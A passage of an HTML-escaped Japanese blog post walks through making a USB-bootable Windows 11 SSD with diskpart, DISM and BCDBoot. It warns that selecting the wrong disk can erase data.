6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#usb%E3%81%8B%E3%82%89%E3%83%96%E3%83%BC%E3%83%88%E5%8F%AF%E8%83%BD%E3%81%AAssd%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;USBからブート可能なSSDを作成する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%82%92%E5%88%9D%E6%9C%9F%E5%8C%96%E3%81%99%E3%82%8B&quot;&gt;インストールするディスクを初期化する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#diskpar%E3%81%A7%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%83%91%E3%83%BC%E3%83%86%E3%82%A3%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92active%E3%81%AB%E3%83%9E%E3%83%BC%E3%82%AF%E3%81%99%E3%82%8B&quot;&gt;diskparでシステムパーティションを「active」にマークする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#diskpar%E3%81%A8%E3%81%AF&quot;&gt;diskparとは&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#dism%E3%81%A8bcdboot%E3%81%A7iso%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%82%92%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%81%AB%E5%B1%95%E9%96%8B%E3%81%99%E3%82%8B&quot;&gt;DISMとBCDBootでISOイメージをディスクに展開する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dism%E3%81%A8%E3%81%AF&quot;&gt;DISMとは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bcdboot%E3%81%A7%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%83%91%E3%83%BC%E3%83%86%E3%82%A3%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;BCDBootでシステムパーティションを作成する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;usbからブート可能なssdを作成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#usb%E3%81%8B%E3%82%89%E3%83%96%E3%83%BC%E3%83%88%E5%8F%AF%E8%83%BD%E3%81%AAssd%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;usbからブート可能なssdを作成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;USBからブート可能なSSDを作成する&lt;/h2&gt;
&lt;p&gt;今回実践した手順は、失敗すると最悪の場合PCのストレージのデータがすべて消去されます。&lt;/p&gt;
&lt;p&gt;そのため、実施する際は細心の注意を払うとともに、自己責任でお願いいたします。&lt;/p&gt;
&lt;p&gt;僕は万が一にもメインPCのデータが飛ぶのは嫌だったので、サブのノートPCでブートメディアを作成しました。&lt;/p&gt;
&lt;p&gt;作成した環境はWindows 11 21H2です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4e7b7b0683cc430a1b14458dd6f77afb/76aed/image-20220303214811571.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 87.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAADIUlEQVQ4y3VUSU/bYBDNqf2LPfUn9NBTW/4EUCCsKhWVkHooUi89QEhsCEmgRdlIbJKQBZx4i7ckXgLt63yfw6aqkZ7Gnoyf37xvxglBOEIQ+LAsC5OxB7mnInfloGkEwO8pcDeNIwh/ZhFxfjqNcEsIwxDsJ2YLSBykM4iiEIZp4c53sXI8wMu5Kl7tNHEk6ZhP3eDbrwHHTq6P/YqGHyUV+YaO7ZwC6dqAaw0xmUyQymSR6JVy8CY+zGFMuCQqeEGEr3fbKLWH2D1V8b2o40texQ5h71wjIhWiZECUDXRUC55jIwwCHAonSFQLP+GNRzBNE67jQCOlPc2GolvwRw6isQPfsxCOYgSz65FjYUywySrDMOFPxjHh/qHAW+50upAkCZeyjEupDnXQx0DVCCos24btuBha9gMsHq04Dof8HA6FHBIpImTmdjodXFxcoEYolcrxda2GaqWC3vU1FEUhUgeu6z7A8zwebZu1TITijDCiU1KZmsEAGikaDFT0+33KUVT6uLm54WCtMTWGYXDc1zCEYRATHhDh7e0UMrWbz+dRLBZxenrGFVbKFZTLZbovoEJKmfrz83Oeq1arkOVLtFpNbhcT9UyhpumkrM/VKfRmTdPIx/jtTDlXr8VdxArNf1pOi3lGKHK5LMkKPO6N+xhnGLH/noAROeQpe25II/dImI4JmTdsdPgp2i7Npc2H3WCRoNO1TqqYOlbHa+kZRsq2LPDHEPMXMw+nUzQaDZxkj3FWklGotiF3dVrDIWpdA1LPRLGlo1JvoCFLVNvEVauFdrv9hNBH9qTw6KGu62gSaZ1GpV6rokvFNq3UyHOofYfHp227T/zjhEGITDr96CFLmtSOPhsJBja4th379D9wH6mOfSAEQaBNSWVobSb81CxOYPPNsPgWWNynZ2C5+21hM0learoBb0SrxxRmcwX+6WHLHUXRM0wfEPL15PnQR+h7VD/mVhlegGuVxIwjpETa5Tdv3yG5voX5j0ksLK1icXntAQvL61hY2cAiQ3KL4jpWtvewuSdh82sBydU1rK5vYG1zC1ufPuP9hzn8BRN8zt9rl/sSAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4e7b7b0683cc430a1b14458dd6f77afb/8ac56/image-20220303214811571.webp 240w,
/static/4e7b7b0683cc430a1b14458dd6f77afb/d3be9/image-20220303214811571.webp 480w,
/static/4e7b7b0683cc430a1b14458dd6f77afb/a3666/image-20220303214811571.webp 546w&quot;
              sizes=&quot;(max-width: 546px) 100vw, 546px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4e7b7b0683cc430a1b14458dd6f77afb/8ff5a/image-20220303214811571.png 240w,
/static/4e7b7b0683cc430a1b14458dd6f77afb/e85cb/image-20220303214811571.png 480w,
/static/4e7b7b0683cc430a1b14458dd6f77afb/76aed/image-20220303214811571.png 546w&quot;
            sizes=&quot;(max-width: 546px) 100vw, 546px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4e7b7b0683cc430a1b14458dd6f77afb/76aed/image-20220303214811571.png&quot;
            alt=&quot;image-20220303214811571&quot;
            title=&quot;image-20220303214811571&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;インストールするディスクを初期化する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%82%92%E5%88%9D%E6%9C%9F%E5%8C%96%E3%81%99%E3%82%8B&quot; aria-label=&quot;インストールするディスクを初期化する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;インストールするディスクを初期化する&lt;/h3&gt;
&lt;p&gt;Windowsの「ディスクの管理」ツールを使用して、ブートメディアに使用するSSDを以下の2つのボリュームに分割します。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;システムパーティション&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ドライブレター：L&lt;/li&gt;
&lt;li&gt;サイズ ：600MB&lt;/li&gt;
&lt;li&gt;ファイルシステム：FAT32&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ボリュームパーティション&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ドライブレター：M&lt;/li&gt;
&lt;li&gt;サイズ：残りの空き領域すべて&lt;/li&gt;
&lt;li&gt;ファイルシステム：NTFS&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ここで初期化するディスクを間違えるとデータが消えてしまうので注意です。&lt;/p&gt;
&lt;p&gt;特にCドライブとして使用しているディスクを消さないように注意しましょう。&lt;/p&gt;
&lt;p&gt;ついでに今回展開するWindowsのISOファイルもダブルクリックしてマウントしておきましょう。&lt;/p&gt;
&lt;p&gt;今回はドライブレター：Fとしてマウントされました。&lt;/p&gt;
&lt;p&gt;初期化が完了した結果はこんな感じになります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2dfedb151fc71ca4540e7b37be0f3dca/d318f/image-20220303231738698.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 15.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAk0lEQVQI12XNQQqDMBAFUO9/nnZrFxaxiBKJJUFQSVJDE7VqeoDfoG5KFo8P82eYSAiBPG+Q3BsUhfTUmYeyVMiyFtfLA3FM/R73WChhiG9PREopf9QgTTkIEWDs/Ydzg7oe/NN276tKBgiRoFTCuQWR1hp9/0LXDdB6hrUbjFm97bTus2n6YhxdwNojjVkwzx/8AFdh1erFmw4jAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/2dfedb151fc71ca4540e7b37be0f3dca/8ac56/image-20220303231738698.webp 240w,
/static/2dfedb151fc71ca4540e7b37be0f3dca/d3be9/image-20220303231738698.webp 480w,
/static/2dfedb151fc71ca4540e7b37be0f3dca/e46b2/image-20220303231738698.webp 960w,
/static/2dfedb151fc71ca4540e7b37be0f3dca/e6c83/image-20220303231738698.webp 1421w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/2dfedb151fc71ca4540e7b37be0f3dca/8ff5a/image-20220303231738698.png 240w,
/static/2dfedb151fc71ca4540e7b37be0f3dca/e85cb/image-20220303231738698.png 480w,
/static/2dfedb151fc71ca4540e7b37be0f3dca/d9199/image-20220303231738698.png 960w,
/static/2dfedb151fc71ca4540e7b37be0f3dca/d318f/image-20220303231738698.png 1421w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/2dfedb151fc71ca4540e7b37be0f3dca/d9199/image-20220303231738698.png&quot;
            alt=&quot;image-20220303231738698&quot;
            title=&quot;image-20220303231738698&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここにブート可能なOSを展開していきます。&lt;/p&gt;
&lt;h3 id=&quot;diskparでシステムパーティションをactiveにマークする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#diskpar%E3%81%A7%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%83%91%E3%83%BC%E3%83%86%E3%82%A3%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92active%E3%81%AB%E3%83%9E%E3%83%BC%E3%82%AF%E3%81%99%E3%82%8B&quot; aria-label=&quot;diskparでシステムパーティションをactiveにマークする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;diskparでシステムパーティションを「active」にマークする&lt;/h3&gt;
&lt;p&gt;通常のWindowsのインストーラを使用してインストールする場合、残念ながらUSB経由で接続したディスクへのインストールはサポートされていません。&lt;/p&gt;
&lt;p&gt;そのため、ブート構成を自分で作成する必要があります。&lt;/p&gt;
&lt;p&gt;以下のコマンドを管理者権限のPowershellで順に実行していきます。&lt;/p&gt;
&lt;p&gt;環境によってディスクやパーティションの番号が異なるのでコピペしないように注意してください。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;diskpart
list disk
&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; ブートメディアに使用するディスクの番号を指定
&lt;span class=&quot;token function&quot;&gt;select&lt;/span&gt; disk 2

list partition
&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; システムパーティション用に600MBで初期化したパーティションの番号を選択
&lt;span class=&quot;token function&quot;&gt;select&lt;/span&gt; partition 1

&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; activeとしてマークして終了
active
&lt;span class=&quot;token keyword&quot;&gt;exit&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実行結果はこんな感じになります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 539px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3737aee7701b1d63fdbd9ec64a1c4a6b/10f9a/image-20220303232019097.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 120%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAYAAAD6S912AAAACXBIWXMAAAsTAAALEwEAmpwYAAACQ0lEQVQ4y5WVWY+CUAyFeVRx3xDcccBoSPj/v67j18zBCy7JPDQXy+3p6WmpUVmWttlsbL/f2+FwsN1u52eaZpZlK8vPmSXrhQ0GsQ2H2NAtjp/PoUW3283W67UlSfIAyBxsPp/bdDr1c7FY+Ps0Te10OrnvE1gDCNB2u/UgTrHFD2MqWC6XX9nJF1EyQBgsCSyKwvCfz2c7Ho/OdjKZfGSGvwG83++W53nDAuDVamX9fv+h26BlBOkMLQSOYIBGGM7RaOQMZ7NZE4yOJIElOsJYMUg0Ho+fDC+Xi2FcxgAkmCAuYvhpBu8AFyD38L8wVAcpG2Y0gsbwGxAZmpKc+1RBDFWQlCQOSDCZACAbbNRxmhRqBSBA+K/Xq2uP1i9dhiWXVALNobTuiIipZOD5pSlkojQ0Ye7ICmuM8sOgbne7fmeIDjCDFaBopEFXZ8PALsDLYPOlAKI5pHQMcMDCuVOgyn4LCBuAMJUKGF0DTLpxmbvIABhNROder9fWkJLRjZPmEAyotFTnNZN0mqoA1OiEOvsc8pLsMIMVmSUBIPi4zIkc2kjEENsCLIrSswAGiIDVKDVFAYAye/zm1HNTsrQgGBA0gkFVVX6GX8ynHdjah+hAIKVQhmbvXRe7GyiOBw1jTYMPNiwoU80BONzaMFcVJNRU8F6jpuXhgPr0AGaguUgg+gkAQG2aMKFWmyqL8suPj4de4BR9NeGTaeG2Sr5XtW8O5quua/9qNGtauv+xKNkwvI+y/sZE3da/27fv9539AqDZSA2kdd0bAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3737aee7701b1d63fdbd9ec64a1c4a6b/8ac56/image-20220303232019097.webp 240w,
/static/3737aee7701b1d63fdbd9ec64a1c4a6b/d3be9/image-20220303232019097.webp 480w,
/static/3737aee7701b1d63fdbd9ec64a1c4a6b/9cb26/image-20220303232019097.webp 539w&quot;
              sizes=&quot;(max-width: 539px) 100vw, 539px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3737aee7701b1d63fdbd9ec64a1c4a6b/8ff5a/image-20220303232019097.png 240w,
/static/3737aee7701b1d63fdbd9ec64a1c4a6b/e85cb/image-20220303232019097.png 480w,
/static/3737aee7701b1d63fdbd9ec64a1c4a6b/10f9a/image-20220303232019097.png 539w&quot;
            sizes=&quot;(max-width: 539px) 100vw, 539px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3737aee7701b1d63fdbd9ec64a1c4a6b/10f9a/image-20220303232019097.png&quot;
            alt=&quot;image-20220303232019097&quot;
            title=&quot;image-20220303232019097&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;diskparとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#diskpar%E3%81%A8%E3%81%AF&quot; aria-label=&quot;diskparとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;diskparとは&lt;/h3&gt;
&lt;p&gt;diskparコマンドインタプリタは、コンピュータ上のドライブを管理するツールです。&lt;/p&gt;
&lt;p&gt;今回は、インストール対象のディスクにフォーカスした上でパーティションを列挙し、600MBのサイズで初期化した方のパーティションを「active」としてマークしました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-server/administration/windows-commands/diskpart&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;diskpart | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このパーティションを「active」としてマークすることで、BIOSまたはEFIに対してこのパーティションがOSのスタートアップファイルを含むことを通知することができるようになります。&lt;/p&gt;
&lt;p&gt;続いて、この領域にOSのスタートアップファイルを配置していきます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-server/administration/windows-commands/active&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;active | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;dismとbcdbootでisoイメージをディスクに展開する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#dism%E3%81%A8bcdboot%E3%81%A7iso%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%82%92%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%81%AB%E5%B1%95%E9%96%8B%E3%81%99%E3%82%8B&quot; aria-label=&quot;dismとbcdbootでisoイメージをディスクに展開する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DISMとBCDBootでISOイメージをディスクに展開する&lt;/h2&gt;
&lt;p&gt;続いて、ISOファイルをSSDに展開していきます。&lt;/p&gt;
&lt;p&gt;以下のコマンドを管理者権限のPowershellで実行します。&lt;/p&gt;
&lt;p&gt;こちらもドライブレターが僕の環境と異なる場合はコピペしないようにしてください。&lt;/p&gt;
&lt;p&gt;完了まで結構時間がかかりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;Dism &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;Apply-Image &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;ImageFile:F:\sources\install&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;wim &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;Index=1 &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;ApplyDir:M:\
M:\Windows\System32\bcdboot M:\Windows &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;l ja-JP &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;s L: &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;f ALL&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実行結果はこんな感じでした。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 798px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/17b17feee4296e2643371ce0f5c713c0/898f6/image-20220303233033290.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAy0lEQVQY03WQ246DMAxE88olhFtYINciCoLu///erJ3dVlu1fTjyOFHGnghrLUIIsNbBe9YzjDGYpgnz/Ku5juOYzrhnrbVO/TAMqd4Rfd8/HnsfYGhAXdfI8xxZlr2F7z4hYozY9z2ZOudQVQpN00CRKRsrxbX50wpFUbxQluUDcRwHzvPE9bqR8YZ19di3Cy7RwNkvxDBRRJ2iMm3bous6cDIezNHZ6G4slmUhkxW32zdxUmxH2470N5o2kkRFW0uiSkgpn+Cz/4Y/EhB72Jky8eQAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/17b17feee4296e2643371ce0f5c713c0/8ac56/image-20220303233033290.webp 240w,
/static/17b17feee4296e2643371ce0f5c713c0/d3be9/image-20220303233033290.webp 480w,
/static/17b17feee4296e2643371ce0f5c713c0/ce206/image-20220303233033290.webp 798w&quot;
              sizes=&quot;(max-width: 798px) 100vw, 798px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/17b17feee4296e2643371ce0f5c713c0/8ff5a/image-20220303233033290.png 240w,
/static/17b17feee4296e2643371ce0f5c713c0/e85cb/image-20220303233033290.png 480w,
/static/17b17feee4296e2643371ce0f5c713c0/898f6/image-20220303233033290.png 798w&quot;
            sizes=&quot;(max-width: 798px) 100vw, 798px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/17b17feee4296e2643371ce0f5c713c0/898f6/image-20220303233033290.png&quot;
            alt=&quot;image-20220303233033290&quot;
            title=&quot;image-20220303233033290&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
